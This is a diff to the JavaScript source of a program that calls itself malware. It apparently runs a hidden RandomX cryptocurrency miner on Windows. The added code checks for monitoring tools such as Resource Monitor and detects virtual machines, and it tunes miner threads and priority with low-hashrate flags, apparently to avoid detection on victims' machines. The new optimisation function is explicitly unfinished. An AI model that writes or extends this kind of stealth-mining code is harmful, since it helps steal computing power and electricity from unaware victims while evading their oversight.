@@ -4,12 +4,12 @@
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
-const  minerStartHashMD5 = '1d26869f8a637d353eae2e65724d6b0b';
+const minerStartHashMD5 = '1d26869f8a637d353eae2e65724d6b0b'; // File integrity and identification
 
 // File path of the miner
 
 let currentMinerPath;
-
+let minerArgs;
 // Win-interact preferences
 
 Win.set.preferences({
@@ -34,6 +34,50 @@ Win.appManager.register({
         path: Win.path`C:\Windows\system32\resmon.exe`,
     },
 });
+
+async function optimizeRandomX() {
+
+    const cpu = await si.cpu();
+    const mem = await si.mem(); // in bytes!
+    // Minimum 2336 MB RAM for each mining thread
+    const L2CacheInKB = cpu.cache.l2/1024;
+    const L3CacheInKB = cpu.cache.l3/1024;
+    const totalMemInMB = mem.total/1048576; // 1024^2
+    let threads;
+    const threadsLimited = {
+        byL2: L2CacheInKB/256,
+        byL3: L3CacheInKB/256,
+        byMemory: totalMemInMB/2336
+    };
+
+    const lowHashrateFlags = {
+        singleThread: '--threads=1',
+        lowAffinity: '--cpu-affinity=1',
+        priority1: '--cpu-priority=1',
+        disableHugePages: '--no-huge-pages',
+        optimizeAssembly: '--asm=auto',
+        randomXLight: '--randomx-mode=light'
+    };
+
+    const mediumHashrateFlags = { // For especially modern and strong CPUs that can take 2 threads with no performance hit
+        dualThread: '--threads=2',
+        priority2: '--cpu-priority=2',
+        disableHugePages: '--no-huge-pages',
+        optimizeAssembly: '--asm=auto',
+        randomXAuto: '--randomx-mode=auto'
+    };
+
+    if (threadsLimited.byL2 < threadsLimited.byL3 && threadsLimited.byL3 > threadsLimited.byMemory) {
+        threads = Math.floor(threadsLimited.byL3);
+    }
+    if (threadsLimited.byL2 > threadsLimited.byL3 && threadsLimited.byL2 > threadsLimited.byMemory) {
+        threads = Math.floor(threadsLimited.byL2);
+    }
+    if (threadsLimited.byMemory > threadsLimited.byL2 && threadsLimited.byMemory > threadsLimited.byL3) {
+        threads = Math.floor(threadsLimited.byMemory);
+    }
+// unfinished
+}
 
 // Main loop of the malware that checks if monitoring applications are running
 
@@ -153,7 +197,12 @@ async function checkForHardwareSupport() {
         const mem = await si.mem(); // in bytes!
         const system = await si.system(); // used for checking if it's a virtual machine
 
-        if (cpu.cores < 2 || mem.total < 4000000000) {
+        const L2CacheInKB = cpu.cache.l2;
+        const L3CacheInKB = cpu.cache.l3;
+
+        if (cpu.cores < 2 || mem.total < 4294967296 || L2CacheInKB < 256 || L3CacheInKB < 2048) {
+            // RandomX requires a MINIMUM of 256 KB L2 cache and 2 MB L3 cache. CPUs with less than 2 cores with less than 4 GB RAM are
+            // not even worth considering.
             await Win.alert('Insufficient system resources to continue.', 'Problem encountered');
             process.exit();
         }
